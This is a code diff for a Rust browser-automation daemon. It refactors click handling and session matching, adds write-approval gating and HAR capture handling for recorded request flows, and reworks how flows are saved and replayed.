     let session_id = mgr.active_session_id()?.to_string();
 
-    let new_tab = cmd.get("newTab").and_then(|v| v.as_bool()).unwrap_or(false);
-
-    if new_tab {
-        use super::element::resolve_element_object_id;
-        let (object_id, effective_session_id) = resolve_element_object_id(
-            &mgr.client,
-            &session_id,
-            &state.ref_map,
-            selector,
-            &state.iframe_sessions,
-        )
-        .await?;
-        let call_params = json!({
-            "objectId": object_id,
-            "functionDeclaration": "function() { var h = this.getAttribute('href'); if (!h) return null; try { return new URL(h, document.baseURI).toString(); } catch(e) { return null; } }",
-            "returnByValue": true
-        });
-        let call_result = mgr
-            .client
-            .send_command(
-                "Runtime.callFunctionOn",
-                Some(call_params),
-                Some(&effective_session_id),
+    let spec = match plan {
+        ClickPlan::NewTab => {
+            use super::element::resolve_element_object_id;
+            let (object_id, effective_session_id) = resolve_element_object_id(
+                &mgr.client,
+                &session_id,
+                &state.ref_map,
+                selector,
+                &state.iframe_sessions,
             )
             .await?;
-        let href = call_result
-            .get("result")
-            .and_then(|r| r.get("value"))
-            .and_then(|v| v.as_str())
-            .ok_or_else(|| {
-                format!(
+            let call_params = json!({
+                "objectId": object_id,
+                "functionDeclaration": "function() { var h = this.getAttribute('href'); if (!h) return null; try { return new URL(h, document.baseURI).toString(); } catch(e) { return null; } }",
+                "returnByValue": true
+            });
+            let call_result = mgr
+                .client
+                .send_command(
+                    "Runtime.callFunctionOn",
+                    Some(call_params),
+                    Some(&effective_session_id),
+                )
+                .await?;
+            let href = call_result
+                .get("result")
+                .and_then(|r| r.get("value"))
+                .and_then(|v| v.as_str())
+                .ok_or_else(|| {
+                    format!(
                     "Element '{}' does not have an href attribute. --new-tab only works on links.",
                     selector
                 )
-            })?
-            .to_string();
+                })?
+                .to_string();
 
-        let domain_filter = state.domain_filter.read().await.clone();
-        let has_proxy_creds = state.proxy_credentials.read().await.is_some();
-        let defer_url_until_controls = should_defer_url_until_network_controls(
-            domain_filter.as_ref(),
-            has_proxy_creds,
-            Some(&href),
-        )?;
-        // `click --new-tab` creates the same kind of daemon-owned tab as
-        // `tab new`, so it must use the same pre-navigation setup path.
-        let defer_url = defer_url_until_controls || session_setup_pending(state).await;
+            let domain_filter = state.domain_filter.read().await.clone();
+            let has_proxy_creds = state.proxy_credentials.read().await.is_some();
+            let defer_url_until_controls = should_defer_url_until_network_controls(
+                domain_filter.as_ref(),
+                has_proxy_creds,
+                Some(&href),
+            )?;
+            // `click --new-tab` creates the same kind of daemon-owned tab as
+            // `tab new`, so it must use the same pre-navigation setup path.
+            let defer_url = defer_url_until_controls || session_setup_pending(state).await;
 
-        state.ref_map.begin_snapshot();
-        state.active_iframe_sessions.clear();
-        state.active_frame_id = None;
-        state.webmcp.clear_invocations();
-        let new_session_id = {
-            let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
-            mgr.tab_new(if defer_url { None } else { Some(&href) }, None)
-                .await?;
-            mgr.active_session_id()?.to_string()
-        };
+            state.ref_map.begin_snapshot();
+            state.active_iframe_sessions.clear();
+            state.active_frame_id = None;
+            state.webmcp.clear_invocations();
+            let new_session_id = {
+                let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
+                mgr.tab_new(if defer_url { None } else { Some(&href) }, None)
+                    .await?;
+                mgr.active_session_id()?.to_string()
+            };
 
-        apply_session_setup(state, &new_session_id).await?;
-        install_network_controls_or_close(state, has_proxy_creds).await?;
-        state.drain_cdp_events_background().await?;
+            apply_session_setup(state, &new_session_id).await?;
+            install_network_controls_or_close(state, has_proxy_creds).await?;
+            state.drain_cdp_events_background().await?;
 
-        if defer_url {
-            let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
-            mgr.navigate(&href, WaitUntil::Load).await?;
+            if defer_url {
+                let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
+                mgr.navigate(&href, WaitUntil::Load).await?;
+            }
+
+            state.refresh_active_iframe_sessions().await;
+
+            return Ok(json!({ "clicked": selector, "newTab": true, "url": href }));
         }
-
-        state.refresh_active_iframe_sessions().await;
-
-        return Ok(json!({ "clicked": selector, "newTab": true, "url": href }));
-    }
-
-    let button = cmd.get("button").and_then(|v| v.as_str()).unwrap_or("left");
-    let click_count = cmd.get("clickCount").and_then(|v| v.as_i64()).unwrap_or(1) as i32;
+        ClickPlan::Pointer(spec) => spec,
+    };
 
     let input_mode = cmd
         .get("inputMode")
@@ -7066,8 +7268,7 @@ async fn handle_click(cmd: &Value, state: &mut DaemonState) -> Result<Value, Str
         &session_id,
         &state.ref_map,
         selector,
-        button,
-        click_count,
+        spec,
         &state.iframe_sessions,
     )
     .await?;
@@ -7077,34 +7278,6 @@ async fn handle_click(cmd: &Value, state: &mut DaemonState) -> Result<Value, Str
         &state.recording_state.shared_cursor,
     );
 
-    if result.dialog_opened {
-        state.pending_pointer_release = result.pending_release;
-        return Ok(json!({ "clicked": selector, "dialogOpened": true }));
-    }
-    Ok(json!({ "clicked": selector }))
-}
-
-async fn handle_dblclick(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
-    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
-    let session_id = mgr.active_session_id()?.to_string();
-    let selector = cmd
-        .get("selector")
-        .and_then(|v| v.as_str())
-        .ok_or("Missing 'selector' parameter")?;
-
-    let result = interaction::dblclick(
-        &mgr.client,
-        &session_id,
-        &state.ref_map,
-        selector,
-        &state.iframe_sessions,
-    )
-    .await?;
-    record_click_animation(
-        &result,
-        &mut state.mouse_state,
-        &state.recording_state.shared_cursor,
-    );
     if result.dialog_opened {
         state.pending_pointer_release = result.pending_release;
         return Ok(json!({ "clicked": selector, "dialogOpened": true }));
@@ -7201,12 +7374,10 @@ fn parse_key_chord(input: &str) -> (String, Option<i32>) {
     let mut key_parts: Vec<&str> = Vec::new();
 
     for part in &parts {
-        match part.to_lowercase().as_str() {
-            "alt" => modifiers |= 1,
-            "control" | "ctrl" => modifiers |= 2,
-            "meta" | "cmd" | "command" => modifiers |= 4,
-            "shift" => modifiers |= 8,
-            _ => key_parts.push(part),
+        if let Some(bit) = Modifiers::bit(part) {
+            modifiers |= bit;
+        } else {
+            key_parts.push(part);
         }
     }
 
@@ -7596,7 +7767,7 @@ async fn handle_reload(state: &mut DaemonState) -> Result<Value, String> {
             match rx.recv().await {
                 Ok(event) => {
                     if event.method == "Page.loadEventFired"
-                        && event.session_id.as_deref() == Some(&session_id)
+                        && session_matches(Some(&session_id), event.session_id.as_deref())
                     {
                         return;
                     }
@@ -8232,8 +8403,12 @@ async fn handle_mouse(cmd: &Value, state: &mut DaemonState) -> Result<Value, Str
     state.mouse_state.x = x;
     state.mouse_state.y = y;
     match event_type {
-        "mousePressed" => state.mouse_state.buttons |= mouse_button_mask(button),
-        "mouseReleased" => state.mouse_state.buttons &= !mouse_button_mask(button),
+        "mousePressed" => {
+            state.mouse_state.buttons |= MouseButton::parse(button).map_or(0, MouseButton::mask)
+        }
+        "mouseReleased" => {
+            state.mouse_state.buttons &= !MouseButton::parse(button).map_or(0, MouseButton::mask)
+        }
         _ => {}
     }
     if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
@@ -8620,8 +8795,7 @@ async fn download_to_path(cmd: &Value, state: &mut DaemonState) -> Result<Value,
         &session_id,
         &state.ref_map,
         selector,
-        "left",
-        1,
+        ClickSpec::default(),
         &state.iframe_sessions,
     )
     .await?;
@@ -8648,7 +8822,8 @@ async fn download_to_path(cmd: &Value, state: &mut DaemonState) -> Result<Value,
                 // or with a different sessionId than the page session, so we
                 // accept them regardless. Page-domain events are matched by
                 // session to avoid cross-tab confusion.
-                let is_page_session = event.session_id.as_deref() == Some(&session_id);
+                let is_page_session =
+                    session_matches(Some(&session_id), event.session_id.as_deref());
                 let is_download_event = |method: &str, browser_method: &str, page_method: &str| {
                     method == browser_method || (method == page_method && is_page_session)
                 };
@@ -10250,7 +10425,7 @@ async fn collect_webmcp_tools(state: &mut DaemonState) -> Result<Vec<webmcp::Too
         match tokio::time::timeout(remaining, rx.recv()).await {
             Ok(Ok(event))
                 if event.method == "WebMCP.toolsAdded"
-                    && event.session_id.as_deref() == Some(session_id.as_str()) =>
+                    && session_matches(Some(session_id.as_str()), event.session_id.as_deref()) =>
             {
                 state
                     .webmcp
@@ -10258,7 +10433,7 @@ async fn collect_webmcp_tools(state: &mut DaemonState) -> Result<Vec<webmcp::Too
             }
             Ok(Ok(event))
                 if event.method == "WebMCP.toolsRemoved"
-                    && event.session_id.as_deref() == Some(session_id.as_str()) =>
+                    && session_matches(Some(session_id.as_str()), event.session_id.as_deref()) =>
             {
                 state.webmcp.apply_tools_removed(&session_id, &event.params);
             }
@@ -10853,8 +11028,7 @@ async fn execute_subaction(
                 &session_id,
                 &state.ref_map,
                 selector,
-                "left",
-                1,
+                ClickSpec::default(),
                 &state.iframe_sessions,
             )
             .await?;
@@ -11160,7 +11334,7 @@ async fn handle_getbyrole(cmd: &Value, state: &mut DaemonState) -> Result<Value,
 
     let ax_tree: GetFullAXTreeResult = mgr
         .client
-        .send_command_typed(
+        .send_command_typed_raw(
             "Accessibility.getFullAXTree",
             &ax_params,
             Some(effective_session_id),
@@ -11811,7 +11985,7 @@ async fn handle_responsebody(cmd: &Value, state: &DaemonState) -> Result<Value, 
         match tokio::time::timeout(remaining, rx.recv()).await {
             Ok(Ok(event)) => {
                 if event.method == "Network.responseReceived"
-                    && event.session_id.as_deref() == Some(&session_id)
+                    && session_matches(Some(&session_id), event.session_id.as_deref())
                 {
                     if let Some(resp_url) = event
                         .params
@@ -12231,6 +12405,7 @@ async fn handle_har_start(cmd: &Value, state: &mut DaemonState) -> Result<Value,
     }
     state.har_recording = true;
     state.har_entries.clear();
+    state.har_progress.clear();
     state.har_content_mode = content_mode;
     state.har_body_total_bytes = 0;
     Ok(json!({ "started": true }))
@@ -12265,6 +12440,8 @@ async fn handle_har_stop(cmd: &Value, state: &mut DaemonState) -> Result<Value, 
     std::fs::write(&path, har_str).map_err(|e| format!("Failed to write HAR: {}", e))?;
 
     state.har_entries.clear();
+
+    state.har_progress.clear();
     state.har_recording = false;
     state.har_body_total_bytes = 0;
 
@@ -12308,8 +12485,44 @@ async fn handle_flow_save(cmd: &Value, state: &mut DaemonState) -> Result<Value,
             .unwrap_or(false),
         None => false,
     };
+    // A request the range started may still be loading; let it finish so its
+    // body is on the entry. Bounded by the command timeout.
+    let from = cmd.get("from").and_then(|v| v.as_u64());
+    let to = cmd.get("to").and_then(|v| v.as_u64());
+    let deadline =
+        tokio::time::Instant::now() + tokio::time::Duration::from_millis(state.timeout_ms(cmd));
+    // A response with headers whose body gets no bytes for the network idle
+    // window is a stream or a long poll.
+    let idle = std::time::Duration::from_millis(super::browser::NETWORK_IDLE_MS);
+    loop {
+        state.drain_cdp_events_background().await?;
+        let stalled = |e: &HarEntry| {
+            state
+                .har_progress
+                .get(&e.request_id)
+                .is_some_and(|t| t.elapsed() >= idle)
+        };
+        if !state
+            .flow
+            .awaiting_response(from, to, &state.har_entries, &stalled)
+            || tokio::time::Instant::now() >= deadline
+        {
+            break;
+        }
+        tokio::time::sleep(tokio::time::Duration::from_millis(25)).await;
+    }
+    let still_loading = state.flow.loading_gaps(from, to, &state.har_entries);
     let entries = state.har_entries.clone();
-    state.flow.save(super::flow::SaveArgs {
+    let mut local_names = Vec::new();
+    let mut reach_note = None;
+    if let Some((host, port, addrs)) = state.flow.start_host_addresses(from, to, &entries) {
+        match super::flow::recorded_local_host(&host, port, &addrs).await {
+            super::flow::RecordedReach::Local(reach) => local_names.push((host, reach)),
+            super::flow::RecordedReach::Unconfirmed(note) => reach_note = Some(note),
+            super::flow::RecordedReach::Unknown => {}
+        }
+    }
+    let saved = state.flow.save(super::flow::SaveArgs {
         name: &name,
         from: cmd.get("from").and_then(|v| v.as_u64()),
         to: cmd.get("to").and_then(|v| v.as_u64()),
@@ -12318,7 +12531,37 @@ async fn handle_flow_save(cmd: &Value, state: &mut DaemonState) -> Result<Value,
         output: cmd.get("output").and_then(|v| v.as_str()),
         entries: &entries,
         login_wall,
-    })
+        local_names: &local_names,
+    });
+    // A save that fails for want of requests names the ones still loading.
+    let mut report = match saved {
+        Ok(report) => report,
+        Err(e) if !still_loading.is_empty() => {
+            let loading: Vec<String> = still_loading
+                .iter()
+                .filter_map(|g| Some(format!("step {}: {}", g["step"], g["reason"].as_str()?)))
+                .collect();
+            return Err(format!("{e}; {}", loading.join("; ")));
+        }
+        Err(e) => return Err(e),
+    };
+    // Requests still loading at the deadline are not in the flow. The step
+    // that started one says so instead of the generic reason.
+    if let Some(gaps) = report["gaps"].as_array_mut() {
+        gaps.retain(|g| {
+            g["kind"] != "no-requests" || !still_loading.iter().any(|l| l["step"] == g["step"])
+        });
+        gaps.extend(still_loading);
+        for g in gaps.iter_mut() {
+            if let Some(g) = g.as_object_mut() {
+                g.remove("kind");
+            }
+        }
+    }
+    if let Some(note) = reach_note {
+        report["reachNote"] = json!(note);
+    }
+    Ok(report)
 }
 
 /// The single write gate: the first write a run sends that `--allow-write`
@@ -12348,9 +12591,22 @@ fn unconfirmed_flow_write(
 async fn handle_flow_run(
     cmd: &Value,
     state: &mut DaemonState,
+    flow: super::flow::Flow,
+) -> Result<Value, String> {
+    // Commands a run sends to the browser are not part of the recording.
+    state.flow.set_suspended(true);
+    let result = handle_flow_run_inner(cmd, state, flow).await;
+    state.flow.set_suspended(false);
+    result
+}
+
+async fn handle_flow_run_inner(
+    cmd: &Value,
+    state: &mut DaemonState,
     mut flow: super::flow::Flow,
 ) -> Result<Value, String> {
     let started = std::time::Instant::now();
+    let run_deadline = started + std::time::Duration::from_millis(state.timeout_ms(cmd));
     let name = flow.name.clone();
     let name = name.as_str();
     let params = super::flow::parse_params(cmd)?;
@@ -12380,9 +12636,16 @@ async fn handle_flow_run(
             .check(&prepared.url)
             .map_err(|e| format!("flow '{}' step {}: {}", name, prepared.step, e))?;
     }
-    let client = super::flow::http_client(filter.clone(), &flow)?;
+    let client = super::flow::http_client(filter.clone(), &flow).await?;
     let results = {
-        let mut sender = HttpSender { state, client };
+        let mut senders = DaemonSenders {
+            wiring: FlowWiring::new(state, &allow),
+            client,
+            flow: &flow,
+            params: &params,
+            replay_run: None,
+            run_deadline,
+        };
         let check = |req: &super::flow::PreparedRequest| -> Result<(), String> {
             hosts
                 .check(&req.url)
@@ -12394,12 +12657,19 @@ async fn handle_flow_run(
                 None => Ok(()),
             }
         };
-        super::flow::run_requests(&requests, &mut sender, &check).await?
+        super::flow::run_requests(&flow, &requests, &mut senders, &check).await?
     };
 
+    // The run's own result comes first: writes it sent happened whether or
+    // not the flow file can be updated, so a save error never hides it.
     if let Some(outcome) = super::flow::RunOutcome::stopped(&results) {
-        state.flow_stop = outcome.data(name);
-        return Err(outcome.message(name));
+        let saved = if super::flow::unverify_on_shape_change(&mut flow, &results) {
+            super::flow::write_flow(&flow).err()
+        } else {
+            None
+        };
+        state.flow_stop = with_save_error(outcome.data(name), saved.as_deref());
+        return Err(with_save_note(outcome.message(name), saved.as_deref()));
     }
 
     let shape = super::flow::Shape::from_cmd(cmd);
@@ -12425,13 +12695,36 @@ async fn handle_flow_run(
         started.elapsed().as_millis(),
         &shape,
     );
-    super::flow::write_flow(&flow)?;
+    let saved = super::flow::write_flow(&flow).err();
     if response["ok"] != json!(true) {
         let outcome = super::flow::RunOutcome::failed(&results, &flow);
-        state.flow_stop = outcome.data(name);
-        return Err(outcome.message(name));
+        state.flow_stop = with_save_error(outcome.data(name), saved.as_deref());
+        return Err(with_save_note(outcome.message(name), saved.as_deref()));
+    }
+    let mut response = response;
+    if let Some(e) = saved {
+        response["saveError"] = json!(e);
     }
     Ok(response)
+}
+
+/// A run's stop data, with the error that kept the flow file from updating.
+fn with_save_error(data: Option<Value>, saved: Option<&str>) -> Option<Value> {
+    match (data, saved) {
+        (Some(mut data), Some(e)) => {
+            data["saveError"] = json!(e);
+            Some(data)
+        }
+        (None, Some(e)) => Some(json!({ "saveError": e })),
+        (data, None) => data,
+    }
+}
+
+fn with_save_note(message: String, saved: Option<&str>) -> String {
+    match saved {
+        Some(e) => format!("{message} (the flow file was not updated: {e})"),
+        None => message,
+    }
 }
 
 /// The focused field's current value, when the page exposes one.
@@ -12501,19 +12794,40 @@ async fn flow_field_traits(
     Some(super::flow::FieldTraits::from_value(&value))
 }
 
+/// CDP `resourceType` of a flow's direct request: the type Fetch.requestPaused
+/// reports for the page tier's `fetch()` (Chrome reports it as XHR).
+const FLOW_DIRECT_RESOURCE_TYPE: &str = "XHR";
+
+/// The route that answers a request: the first one, in registration order,
+/// whose URL pattern and resource types match and that aborts or has a
+/// response. Shared by browser interception and the flow HTTP tier.
+fn select_route<'a>(
+    routes: &'a [RouteEntry],
+    url: &str,
+    resource_type: &str,
+) -> Option<&'a RouteEntry> {
+    routes.iter().find(|route| {
+        route_url_matches(&route.url_pattern, url)
+            && (route.resource_types.is_empty()
+                || route
+                    .resource_types
+                    .iter()
+                    .any(|rt| rt.eq_ignore_ascii_case(resource_type)))
+            && (route.abort || route.response.is_some())
+    })
+}
+
 /// The session route that would answer this request in the page, if any.
 async fn flow_routed_response(
     state: &DaemonState,
     url: &str,
 ) -> Option<super::flow::RoutedResponse> {
     let routes = state.routes.read().await;
-    let route = routes.iter().find(|r| {
-        route_url_matches(&r.url_pattern, url)
-            && (r.resource_types.is_empty()
-                || r.resource_types
-                    .iter()
-                    .any(|t| t.eq_ignore_ascii_case("fetch") || t.eq_ignore_ascii_case("xhr")))
-    })?;
+    flow_route_answer(&routes, url)
+}
+
+fn flow_route_answer(routes: &[RouteEntry], url: &str) -> Option<super::flow::RoutedResponse> {
+    let route = select_route(routes, url, FLOW_DIRECT_RESOURCE_TYPE)?;
     if route.abort {
         return Some(super::flow::RoutedResponse {
             abort: true,
@@ -12529,27 +12843,208 @@ async fn flow_routed_response(
     })
 }
 
-/// Sends a flow's requests directly, with the session's cookies and routes.
-struct HttpSender<'a> {
+async fn flow_ensure_browser(state: &mut DaemonState) -> Result<(), String> {
+    if state.browser.is_none() {
+        auto_launch(state, Vec::new()).await?;
+        state.webmcp_enabled = state.settings.webmcp();
+    }
+    Ok(())
+}
+
+/// A write only the command replay sends: the policy file can deny it, and
+/// it needs `--allow-write` or a confirmation like any other write.
+fn replay_write_approved(
+    state: &DaemonState,
+    allow: &super::flow::AllowWrite,
+    write: &super::flow::Write,
+) -> Result<(), String> {
+    let action = write.action();
+    let confirmed = state.confirmed_policy_actions.contains(&action);
+    if let Some(policy) = state.policy.as_ref() {
+        match policy.check(&action) {
+            PolicyResult::Allow => {}
+            PolicyResult::Deny(reason) => return Err(format!("denied by policy: {}", reason)),
+            PolicyResult::RequiresConfirmation if !confirmed => {
+                return Err("the policy requires confirmation".to_string())
+            }
+            PolicyResult::RequiresConfirmation => {}
+        }
+    }
+    if !confirmed
+        && state
+            .confirm_actions
+            .as_ref()
+            .is_some_and(|ca| ca.requires_confirmation(&action))
+    {
+        return Err("--confirm-actions requires confirmation".to_string());
+    }
+    if allow.covers(&write.id) || confirmed {
+        Ok(())
+    } else {
+        Err(format!("rerun with --allow-write {} to allow it", write.id))
+    }
+}
+
+/// The daemon behind the flow ports: the browser session, its cookies and
+/// routes, and the commands a replay runs.
+struct FlowWiring<'a> {
     state: &'a mut DaemonState,
-    client: super::flow::HttpClients,
+    allow: &'a super::flow::AllowWrite,
+    started_har: bool,
+    /// The session's HAR content mode, to put back after a replay that
+    /// needed bodies the mode would not keep.
+    restore_content: Option<HarContentMode>,
+    mark: usize,
+}
+
+impl<'a> FlowWiring<'a> {
+    fn new(state: &'a mut DaemonState, allow: &'a super::flow::AllowWrite) -> Self {
+        FlowWiring {
+            state,
+            allow,
+            started_har: false,
+            restore_content: None,
+            mark: 0,
+        }
+    }
 }
 
 #[async_trait::async_trait]
-impl super::flow::Sender for HttpSender<'_> {
-    async fn send(&mut self, req: &super::flow::PreparedRequest) -> super::flow::RequestResult {
-        let cookie = match self.state.browser.as_ref() {
-            Some(mgr) => match mgr.active_session_id() {
-                Ok(sid) => cookies::get_cookies(&mgr.client, sid, Some(vec![req.url.clone()]))
-                    .await
-                    .ok()
-                    .map(|c| super::flow::cookie_header(&c)),
-                Err(_) => None,
-            },
+impl super::flow::Browser for FlowWiring<'_> {
+    async fn cookie_header(&mut self, url: &str) -> Option<String> {
+        let mgr = self.state.browser.as_ref()?;
+        let sid = mgr.active_session_id().ok()?;
+        cookies::get_cookies(&mgr.client, sid, Some(vec![url.to_string()]))
+            .await
+            .ok()
+            .map(|c| super::flow::cookie_header(&c))
+    }
+
+    async fn routed_response(&mut self, url: &str) -> Option<super::flow::RoutedResponse> {
+        flow_routed_response(self.state, url).await
+    }
+
+    async fn tab_url(&mut self) -> Option<String> {
+        match self.state.browser.as_ref() {
+            Some(mgr) => mgr.get_url().await.ok(),
             None => None,
-        };
-        let routed = flow_routed_response(self.state, &req.url).await;
-        super::flow::run_http(&self.client, req, cookie.as_deref(), routed).await
+        }
+    }
+
+    async fn eval(&mut self, script: &str) -> Result<Value, String> {
+        match self.state.browser.as_ref() {
+            Some(mgr) => mgr.evaluate(script, None).await,
+            None => Err("Browser not launched".to_string()),
+        }
+    }
+
+    async fn ensure_browser(&mut self) -> Result<(), String> {
+        flow_ensure_browser(self.state).await
+    }
+
+    async fn begin_capture(&mut self) -> Result<usize, String> {
+        self.started_har = !self.state.har_recording;
+        if self.started_har {
+            handle_har_start(&json!({}), self.state).await?;
+        }
+        // Earlier tiers' responses may still be queued; they are not the
+        // replay's, and they are drained before the mode changes so they
+        // gain no bodies.
+        let _ = self.state.drain_cdp_events_background().await;
+        if !self.started_har && self.state.har_content_mode == HarContentMode::None {
+            // The replay reads its answers from bodies, so it keeps them for
+            // its own requests even when the session's HAR does not.
+            self.restore_content = Some(HarContentMode::None);
+            self.state.har_content_mode = HarContentMode::Text;
+        }
+        self.mark = self.state.har_entries.len();
+        Ok(self.mark)
+    }
+
+    async fn run(&mut self, cmd: &Value) -> Value {
+        Box::pin(execute_command(cmd, self.state)).await
+    }
+
+    async fn captured_since(&mut self, mark: usize) -> Vec<HarEntry> {
+        let _ = self.state.drain_cdp_events_background().await;
+        self.state.har_entries[mark.min(self.state.har_entries.len())..].to_vec()
+    }
+
+    async fn end_capture(&mut self) {
+        let _ = self.state.drain_cdp_events_background().await;
+        if let Some(mode) = self.restore_content.take() {
+            // Entries from before the replay keep the no-body mode they had.
+            let keep = self.mark.min(self.state.har_entries.len());
+            for e in &mut self.state.har_entries[..keep] {
+                let size = e.response_body.take().map_or(0, |b| b.len());
+                e.response_body_base64 = false;
+                self.state.har_body_total_bytes =
+                    self.state.har_body_total_bytes.saturating_sub(size);
+            }
+            self.state.har_content_mode = mode;
+        }
+        if self.started_har {
+            self.state.har_recording = false;
+            self.state.har_entries.clear();
+            self.state.har_body_total_bytes = 0;
+        } else {
+            // The session's own capture keeps only what it held before the run.
+            let keep = self.mark.min(self.state.har_entries.len());
+            let dropped: usize = self.state.har_entries[keep..]
+                .iter()
+                .map(|e| e.response_body.as_ref().map_or(0, |b| b.len()))
+                .sum();
+            self.state.har_entries.truncate(keep);
+            self.state.har_body_total_bytes =
+                self.state.har_body_total_bytes.saturating_sub(dropped);
+        }
+    }
+
+    fn write_approved(&self, write: &super::flow::Write) -> Result<(), String> {
+        replay_write_approved(self.state, self.allow, write)
+    }
+}
+
+/// One sender per tier over the same daemon wiring.
+struct DaemonSenders<'a> {
+    wiring: FlowWiring<'a>,
+    client: super::flow::HttpClients,
+    flow: &'a super::flow::Flow,
+    params: &'a [(String, String)],
+    replay_run: Option<super::flow::ReplayRun>,
+    /// When the run must be done, so the CLI is still waiting for it.
+    run_deadline: std::time::Instant,
+}
+
+#[async_trait::async_trait]
+impl super::flow::Senders for DaemonSenders<'_> {
+    async fn send(
+        &mut self,
+        tier: super::flow::Tier,
+        req: &super::flow::PreparedRequest,
+        ctx: &super::flow::SendCtx<'_>,
+    ) -> super::flow::TierResult {
+        use super::flow::{http, page, replay, Tier};
+        match tier {
+            Tier::Http => http::send(&self.client, &mut self.wiring, req, self.run_deadline).await,
+            Tier::Page => page::send(self.flow, &mut self.wiring, req, self.run_deadline).await,
+            Tier::Replay => {
+                replay::send(
+                    self.flow,
+                    self.params,
+                    &mut self.wiring,
+                    &mut self.replay_run,
+                    req,
+                    ctx,
+                    self.run_deadline,
+                )
+                .await
+            }
+        }
+    }
+
+    fn replay_ran(&self) -> bool {
+        self.replay_run.is_some()
     }
 }
 
@@ -12759,6 +13254,66 @@ fn har_parse_request_cookies(cookie_header: &str) -> Vec<Value> {
             Some(json!({ "name": name.trim(), "value": value.trim() }))
         })
         .collect()
+}
+
+/// Copies a CDP `Response` (from `responseReceived` or a `redirectResponse`)
+/// onto its tracked request.
+fn tracked_fill_response(entry: &mut TrackedRequest, response: &Value) {
+    entry.status = response.get("status").and_then(|v| v.as_i64());
+    entry.mime_type = response
+        .get("mimeType")
+        .and_then(|v| v.as_str())
+        .map(String::from);
+    entry.response_headers = response.get("headers").cloned();
+}
+
+/// Copies a CDP `Response` (from `responseReceived` or a `redirectResponse`)
+/// onto its HAR entry.
+fn har_fill_response(entry: &mut HarEntry, response: &Value) {
+    entry.status = response.get("status").and_then(|v| v.as_i64());
+    entry.status_text = response
+        .get("statusText")
+        .and_then(|v| v.as_str())
+        .unwrap_or("")
+        .to_string();
+    entry.mime_type = response
+        .get("mimeType")
+        .and_then(|v| v.as_str())
+        .unwrap_or("")
+        .to_string();
+    entry.http_version = response
+        .get("protocol")
+        .and_then(|v| v.as_str())
+        .map(har_cdp_protocol_to_http_version)
+        .unwrap_or_else(|| "HTTP/1.1".to_string());
+    entry.response_headers = har_extract_headers(response.get("headers"));
+    entry.redirect_url = entry
+        .response_headers
+        .iter()
+        .find(|(k, _)| k.eq_ignore_ascii_case("location"))
+        .map(|(_, v)| v.clone())
+        .unwrap_or_default();
+    entry.response_body_size = response
+        .get("encodedDataLength")
+        .and_then(|v| v.as_i64())
+        .unwrap_or(-1);
+    entry.cdp_timing = response.get("timing").cloned();
+    entry.remote_addr = response
+        .get("remoteIPAddress")
+        .and_then(|v| v.as_str())
+        .and_then(|ip| {
+            ip.trim_start_matches('[')
+                .trim_end_matches(']')
+                .parse::<std::net::IpAddr>()
+                .ok()
+        })
+        .zip(
+            response
+                .get("remotePort")
+                .and_then(|v| v.as_u64())
+                .and_then(|p| u16::try_from(p).ok()),
+        )
+        .map(|(ip, port)| std::net::SocketAddr::new(ip, port));
 }
 
 /// Compute HAR `timings` and total `time` (ms) from a CDP `ResourceTiming`
@@ -13167,49 +13722,36 @@ async fn resolve_fetch_paused(
     }
 
     // Route matching
-    for route in routes {
-        let url_matches = route_url_matches(&route.url_pattern, &paused.url);
+    if let Some(route) = select_route(routes, &paused.url, &paused.resource_type) {
+        if route.abort {
+            let _ = client
+                .send_command(
+                    "Fetch.failRequest",
+                    Some(json!({
+                        "requestId": paused.request_id,
+                        "errorReason": "Failed"
+                    })),
+                    Some(session_id),
+                )
+                .await;
+            return;
+        }
 
-        let resource_type_matches = route.resource_types.is_empty()
-            || route
-                .resource_types
-                .iter()
-                .any(|rt| rt.eq_ignore_ascii_case(&paused.resource_type));
-
-        let matches = url_matches && resource_type_matches;
-
-        if matches {
-            if route.abort {
-                let _ = client
-                    .send_command(
-                        "Fetch.failRequest",
-                        Some(json!({
-                            "requestId": paused.request_id,
-                            "errorReason": "Failed"
-                        })),
-                        Some(session_id),
-                    )
-                    .await;
-                return;
-            }
-
-            if let Some(ref resp) = route.response {
-                let (status, headers, encoded) =
-                    mocked_response(resp, paused.request_headers.as_ref());
-                let _ = client
-                    .send_command(
-                        "Fetch.fulfillRequest",
-                        Some(json!({
-                            "requestId": paused.request_id,
-                            "responseCode": status,
-                            "responseHeaders": headers,
-                            "body": encoded,
-                        })),
-                        Some(session_id),
-                    )
-                    .await;
-                return;
-            }
+        if let Some(ref resp) = route.response {
+            let (status, headers, encoded) = mocked_response(resp, paused.request_headers.as_ref());
+            let _ = client
+                .send_command(
+                    "Fetch.fulfillRequest",
+                    Some(json!({
+                        "requestId": paused.request_id,
+                        "responseCode": status,
+                        "responseHeaders": headers,
+                        "body": encoded,
+                    })),
+                    Some(session_id),
+                )
+                .await;
+            return;
         }
     }
 
@@ -13499,9 +14041,12 @@ async fn handle_request_detail(cmd: &Value, state: &mut DaemonState) -> Result<V
         .and_then(|v| v.as_str())
         .ok_or("Missing 'requestId' parameter")?;
 
+    // Redirect hops share a request id; the last one is the response a body
+    // belongs to.
     let entry = state
         .tracked_requests
         .iter()
+        .rev()
         .find(|r| r.request_id == request_id)
         .ok_or("Request not found")?;
 
@@ -14179,8 +14724,7 @@ async fn handle_auth_login(cmd: &Value, state: &mut DaemonState) -> Result<Value
         &session_id,
         &submit_element.ref_map,
         AUTH_LOGIN_ELEMENT_REF,
-        "left",
-        1,
+        ClickSpec::default(),
         &state.iframe_sessions,
     )
     .await?;
@@ -14201,7 +14745,7 @@ async fn handle_auth_login(cmd: &Value, state: &mut DaemonState) -> Result<Value
         let result = tokio::time::timeout_at(deadline, rx.recv()).await;
         match result {
             Ok(Ok(event)) => {
-                if event.session_id.as_deref() == Some(&session_id) {
+                if session_matches(Some(&session_id), event.session_id.as_deref()) {
                     match event.method.as_str() {
                         "Page.frameNavigated" | "Page.loadEventFired" => {
                             navigated = true;
@@ -14434,33 +14978,6 @@ async fn handle_device_list() -> Result<Value, String> {
 // Input event handlers
 // ---------------------------------------------------------------------------
 
-fn mouse_button_mask(button: &str) -> i32 {
-    match button {
-        "left" => 1,
-        "right" => 2,
-        "middle" => 4,
-        "back" => 8,
-        "forward" => 16,
-        _ => 0,
-    }
-}
-
